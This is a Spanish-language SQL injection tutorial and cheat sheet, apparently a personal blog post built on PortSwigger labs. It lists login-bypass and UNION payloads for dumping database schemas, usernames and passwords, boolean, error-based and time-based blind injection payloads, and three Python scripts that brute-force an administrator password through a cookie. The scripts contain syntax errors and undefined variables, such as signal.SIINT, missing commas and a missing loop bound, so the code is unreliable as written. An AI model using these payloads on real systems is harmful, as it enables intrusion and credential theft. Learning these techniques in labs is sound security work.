---
title: "SQL Inyection"
author: Tuch0
date: 2023-09-19
categories: []
tags: 
  - xxe-injection
  - xxe
image:
    path: ../../assets/Miniaturas/VectoresDeAtaque/sql-analisis-negocio-cursin.jpg
    width: 800
    height: 500
---

> [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

# Indíce
- Tipos de bases de datos
- Estructura de bases de datos
- Inyecciones básicas
- Obteniendo datos ocultos 
- ByPass Panel Inicio de Sesión
- Obtener el número de columnas
- Obteniendo data de otras tablas
- SQLi en base de datos Oracle
- Inyecciones a Ciegas
- SQL Respuesta Condicional
- SQL Error Condicional
- SQL Inyección Basada en tiempo
- SQL Inyección with filter bypass vía XML encoding

## Tipos de báses de datos
- MariaDB
- Oracle
- MySQL

## Estructura de bases de datos
- DBS (Bases de datos)
- Tables (Tablas)
- Columns (Columnas)
- Data (Datos)

# Inyecciones Básicas

### Obteniendo datos ocultos

```sql
or 1=1-- -
```

> Lo que hace esta "qwery" es comentar el resto de el código , al cumplirse la condición de 1=1 se comenta el resto de el código gracias a "-- -"
{: .prompt-info }

```shell
// Main URL
https://insecure-website.com/products?category=Gifts 

// Inyeccion
https://insecure-website.com/products?category=Gifts' OR 1=1-- -
https://insecure-website.com/products?category=Gifts'+OR+1=1--+-

// Inyeccion v2
https://insecure-website.com/products?category=Gifts' OR 1=1#
https://insecure-website.com/products?category=Gifts'+OR+1=1#
```

### ByPass Panel Inicio de Sesión

> "Qwery" Trasera:
{: .prompt-tip }

```sql
SELECT * FROM users WHERE username = 'administrator'-- -' AND password = '%s'
```

```sql
//Camo usuario
administrator'-- -

// Campo contraseña
loquesea
```

> Tenemos que ir probando asta que encontremos el número máximo de columnas que la web no da error
{: .prompt-info }

### Obtener columna con texto

> "Qwery" Trasera:
{: .prompt-tip }

```sql
select password,subscription from users where username = 'Tucho'
```

```sql
// Sabiendo el número de columnas (en este caso 5)
union select 1,2,3,4,5-- -

// Fijaos si algún número se representa por pantalla (en este caso el 3)
union select 1,2,'Loquesea',4,5-- -
```

> De esta mánera si encontramos una columna que tenga texto , podemos aprovecharnos de ella para inyectar comandos
{: .prompt-info }

### Obteniendo data de otras tablas

> "Qwery" Trasera:
{: .prompt-tip }

```sql
select * from products where category = 'Pets'
```

```sql
// Devuelve la base de datos en uso
union select database(),NULL-- -

// Devuelve todas las bases de datos
union select schema_name,NULL from information_schema.schemata-- -

// Devuelve todas las tablas existentes
union select table_name,NULL from information_schema.tables-- -

// Devuelve todas las tablas de una base de datos en concreta
union select table_name,NULL from information_schema.tables where table_schema='<DB>'-- -

// Devuelve todas las columnas existentes
union select column_name,NULL from information_schema.columns where table_schema='<DB>' and table_name='<tabla>'-- -

// Devuelve los datos de las columnas (De la DB en uso)
union select username,NULL from users-- -
union select password,NULL from users-- - 

// Devuelve los datos de las columnas (De la DB que indiquemos)
union select username,NULL from <DB>.<table>-- -
union select password,NULL from <DB>.<table>-- - 

// Devuelve datos de un usuario específico
union select password from users where username='admin'-- -

// Representamos dos datos en una columna separados por ":"
union select group_concat(username,':',password),NULL from users-- -
union select group_concat(username,'0x3a',password),NULL from users-- -
union select username||':'||password,NULL from users-- -
```

### SQLi en base de datos Oracle

```sql
// Enumerar las columnas existentes
union select NULL,NULL from dual-- -

// Version
union select banner,NULL from v$version-- -
union select version,NULL FROM v$instance-- -

// Enumerar las tablas existentes
union select table_name,NULL from all_tables-- -

// Enumerar las tablas con propietario que le indiquemos
union select table_name,NULL from all_tables where owner='<propietario>'

// Enumerar las columnas de la tabla indicada
union select column_name,NULL from all_tab_columns where table_name='<tabla>'

// Enumerar el contenido de las columnas indicadas
union select <columna>,NULL from <tabla>

// Enumerar más de dos campos de contenido en una misma columna
union select <columna>||':'||<columna2>,NULL from <tabla>
```

## Inyecciones a Ciegas

> Las inyecciones a ciegas son aquellas que en pantalla no te reportan nadaj , no te dumpean datos ni nada , el unico cambio que puedes ver es si lo que as introducido es correcto , por pantalla te muestra un mensajito que pone "welcome back" (Cabde destacar que cáda web es un mundo) en este caso pone "welcome back" cuando la "qwery" es correcta.
{: .prompt-tip }

### SQL Respuesta Condicional

![](../../assets/VectoresDeAtaque/Eternal-Blue/2.jpg)

> Como vemos si se cumple lo que le estamos indicando sale el mensaje , lo que le estamos diciendo en la "qwery" es , selecciona el primer caracter de la columna "username" de la tabla "users" donde el "username" sea "administrator" y para terminar le ponemos un = "a"
{: .prompt-tip }

> Con esto lo que podemos hacer es hacerlo en la columna de contraseña de la tabla "users" y de username "administrator" de manera que podemos hacer un script que nos reporte la contraseña de "administrator" mediante fuerza bruta , gracias a que tenemos como referencia de si el caracter es valido o no el mensaje de la web "welcome back"
{: .prompt-tip }

![](../../assets/VectoresDeAtaque/SQL-Inyection/1.jpg)

```sql
// Longitud de la contraseña de administrador a ciegas
and (select 'a' from users where username='administrator' and length(password)<20)='a
```

```sql
// Longitud de la contraseña de administrador a ciegas v2
and (select 'a' from users where username='administrator' and length(password)<=20)='a
```

> Una vez que sabemos la longitud de la contraseña , vamos a hacer el "script"
{: .prompt-tip }

```python
#!/usr/bin/python

# Importamos las librerias
from pwn import *
import requests, signal, time, pdb, sys, string


# Funcion Ctrl+C
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIINT, def_handler)


# Variables generales
main_url = "<url>"
characters = string.ascii_lowercase + string.digits


# Funciones principales
def makerequests():
    # Variables principales
    password = ""
    
    # Creamos una barra de progreso
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    
    # Esperamos 2 segundos
    time.sleep(2)
    
    # Creamos segunda barra de progreso
    p2 = log.progress("Password")
    
    # Indicamos la longitud de la contraseña
    for position in range(1, x):
        for character in characters:
            # Creamos la cookie
            cookies = {
                'TrackingId': "TrackingId=xxxxxxxxxxxxxxx and (select substring(password,%d,1) from users where username='administrator')='%s"  % (position, character)
                'session' : 'xxxxxxxxxxxxxxxxxxxxxxxx'
            }
            
            # Actualizamos la barra de progreso
            p1.status(cookies['TrackingId'])
            
            # Creamos la petición
            r = requests.get(main_url,cookies=cookies)
        
            # Validamos si existe "Welcome Back!" en la respuesta de la web
            if "Welcome back!" in r.text:
                password += character
                # Actualizamos la barra de progreso "password"
                p2.status(password)
                break
            else
                continue

# Inicio flujo de el programa
if __name__ == '__main__':
    makerequests()

```

![](../../assets/VectoresDeAtaque/SQL-Inyection/2.jpg)

### SQL Error Condicional

![](../../assets/VectoresDeAtaque/SQL-Inyection/3.jpg)

![](../../assets/VectoresDeAtaque/SQL-Inyection/4.jpg)

> Cabe destacar que en SQL se lee de derecha a izquierda , lo que esta leyendo primero es valijdar si existe un usuario que se llame adminisatrador en la tabla "users" , si existe leera la "qwery" de derecha a izquierda entonces dira , en el que la operatoria 1=1 sea correcta genera un error (to_char(1/0))
{: .prompt-tip }

> Con esto lo que conseguimos es que en caso en el que exista el usuario indicado genere un error, en el caso de que no exista que nos devuelva un 200 OK
{: .prompt-tip }

![](../../assets/VectoresDeAtaque/SQL-Inyection/5.jpg)

> Ahora sabiendo eso vamos a averiguar la longitud de la contraseña , realizaremos fuerza bruta como antes para obtener la contraseña
{: .prompt-info }

![](../../assets/VectoresDeAtaque/SQL-Inyection/6.jpg)

![](../../assets/VectoresDeAtaque/SQL-Inyection/7.jpg)

> Ahora sabiendo la longitud de la contraseña vamos a tratar de hacer el script para conseguir la contraseña con fuerza bruta
{: .prompt-tip }

![](../../assets/VectoresDeAtaque/SQL-Inyection/8.jpg)

> Sabiendo esto vamos a usar la misma "Qwery" para conseguir la contraseña por fuerza bruta
{: .prompt-info }

```shell
#!/usr/bin/python

# Importamos las librerias
from pwn import *
import requests, signal, time, pdb, sys, string


# Funcion Ctrl+C
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIINT, def_handler)


# Variables generales
main_url = "<url>"
characters = string.ascii_lowercase + string.digits


# Funciones principales
def makerequests():
    # Variables principales
    password = ""
    
    # Creamos una barra de progreso
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    
    # Esperamos 2 segundos
    time.sleep(2)
    
    # Creamos segunda barra de progreso
    p2 = log.progress("Password")
    
    # Indicamos la longitud de la contraseña
    for position in range(1, x):
        for character in characters:
            # Creamos la cookie
            cookies = {
                'TrackingId': "TrackingId=xxxxxxxxxxxxxxx'||select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username'administrator')||"  % (position, character)
                'session' : 'xxxxxxxxxxxxxxxxxxxxxxxx'
            }
            
            # Actualizamos la barra de progreso
            p1.status(cookies['TrackingId'])
            
            # Creamos la petición
            r = requests.get(main_url,cookies=cookies)
        
            # Validamos si existe "Welcome Back!" en la respuesta de la web
            if r.status_code == 500:
                password += character
                # Actualizamos la barra de progreso "password"
                p2.status(password)
                break
            else
                continue

# Inicio flujo de el programa
if __name__ == '__main__':
    makerequests()

```
![](../../assets/VectoresDeAtaque/SQL-Inyection/9.jpg)

### SQL Inyección Basada en tiempo

```sql
// Oracle
dbms_pipe.receive_message(('a'),10) 

// Microsoft
WAITFOR DELAY '0:0:10' 

// PostGreSQL
SELECT pg_sleep(10)

// MySQL
SELECT SLEEP(10) 
```
![](../../assets/VectoresDeAtaque/SQL-Inyection/10.jpg)

> Ahroa vamos a intentar obtener credenciales validando el tiempo de espera
{: .prompt-tip }

![](../../assets/VectoresDeAtaque/SQL-Inyection/11.jpg)

> Recordamos SQL se lee de derecha a izquierda por lo tanto primero valida que el usuario "admnistrador" existe y si es asi empieza a leer desde el principio , encones si la condicion 1=1 se cumple , tiene que esperar 10 segundos (pg_sleep(10) y si no existe que no espere
{: .prompt-info }

> De esta manera gracias a el tiempo de espera podemos tratar de dumpear la contraseña mediante fuerza bruta
{: .prompt-info }

![](../../assets/VectoresDeAtaque/SQL-Inyection/12.jpg)

![](../../assets/VectoresDeAtaque/SQL-Inyection/13.jpg)

```shell
#!/usr/bin/python

# Importamos las librerias
from pwn import *
import requests, signal, time, pdb, sys, string


# Funcion Ctrl+C
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIINT, def_handler)


# Variables generales
main_url = "<url>"
characters = string.ascii_lowercase + string.digits


# Funciones principales
def makerequests():
    # Variables principales
    password = ""
    
    # Creamos una barra de progreso
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")
    
    # Esperamos 2 segundos
    time.sleep(2)
    
    # Creamos segunda barra de progreso
    p2 = log.progress("Password")
    
    # Indicamos la longitud de la contraseña
    for position in range(1, x):
        for character in characters:
            # Creamos la cookie
            cookies = {
                'TrackingId': "xxxxxxxxxxxxxxx'||select case when substring(password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -"  % (position, character)
                'session' : 'xxxxxxxxxxxxxxxxxxxxxxxx'
            }
            
            # Actualizamos la barra de progreso
            p1.status(cookies['TrackingId'])
            
            # Calculamos el tiempo
            time_start = time.time()
            
            # Creamos la petición
            r = requests.get(main_url,cookies=cookies)
            
            # Paramos el tiempo
            time_end = time.time()
        
            # Validamos si existe "Welcome Back!" en la respuesta de la web
            if time_end - time_start > 1.5:
                password += character
                # Actualizamos la barra de progreso "password"
                p2.status(password)
                break
            else
                continue

# Inicio flujo de el programa
if __name__ == '__main__':
    makerequests()
```

![](../../assets/VectoresDeAtaque/SQL-Inyection/14.jpg)

### SQL Injection with filter bypass via XML encoding

![](../../assets/VectoresDeAtaque/SQL-Inyection/15.jpg)

> Como vemos se puede inyectar comandos en la estructura XML pero la web nos lo detecta por lo que nos hace pensar es que por detrás esta corriendo un WAF
{: .prompt-info }

![](../../assets/VectoresDeAtaque/SQL-Inyection/16.jpg)

![](../../assets/VectoresDeAtaque/SQL-Inyection/17.jpg)

> Ya hemos conseguido Bypassear el WAF, ahora podemos dumpear la información que queramos
{: .prompt-tip }

![](../../assets/VectoresDeAtaque/SQL-Inyection/18.jpg)